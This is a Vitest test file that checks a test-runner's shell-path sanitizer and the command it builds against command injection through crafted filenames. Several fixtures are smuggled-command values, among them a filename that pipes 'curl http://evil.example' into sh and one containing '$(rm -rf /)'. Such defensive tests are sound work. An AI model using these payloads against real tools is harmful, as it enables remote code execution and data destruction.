import { describe, it, expect, beforeAll, afterAll } from "vitest";
import { mkdtempSync, writeFileSync, rmSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { sanitizeShellPath, suggestedTestCommand } from "../src/neutron/test-runner";

let root: string;
beforeAll(() => {
  root = mkdtempSync(join(tmpdir(), "neutron-sanitize-"));
  // vitest branch of suggestedTestCommand triggers on the config file.
  writeFileSync(join(root, "vitest.config.ts"), "export default {};\n");
});
afterAll(() => rmSync(root, { recursive: true, force: true }));

describe("sanitizeShellPath", () => {
  it("strips shell-special characters but keeps normal paths intact", () => {
    expect(sanitizeShellPath("tests/auth.test.ts")).toBe("tests/auth.test.ts");
    expect(sanitizeShellPath("src/my file.test.ts")).toBe("src/my file.test.ts");
    expect(sanitizeShellPath('tests/a"; curl http://evil.example | sh; ".test.ts')).not.toContain('"');
    expect(sanitizeShellPath("tests/`whoami`.test.ts")).not.toContain("`");
    expect(sanitizeShellPath("tests/$(rm -rf /).test.ts")).not.toContain("$");
  });
});

describe("suggestedTestCommand injection resistance (regression)", () => {
  it("does not let a crafted filename break out of quoting", () => {
    const evil = 'tests/a"; curl http://evil.example | sh; ".test.ts';
    const cmd = suggestedTestCommand(root, [{ node: "x", reason: "test", selected: [evil] }]);
    // The word "curl" may survive as inert filename text, but it can no longer
    // break out of quoting: no statement separators, no pipes, no quotes left.
    expect(cmd).not.toContain(";");
    expect(cmd).not.toContain("|");
    // every interpolated segment stays inside its own double quotes
    expect(cmd).toMatch(/^npx vitest run ("[^"]*") --concurrency 1$/);
  });

  it("still passes through legitimate file lists", () => {
    const cmd = suggestedTestCommand(root, [
      { node: "a", reason: "test", selected: ["tests/a.test.ts", "tests/b.test.ts"] },
    ]);
    expect(cmd).toBe('npx vitest run "tests/a.test.ts" "tests/b.test.ts" --concurrency 1');
  });
});
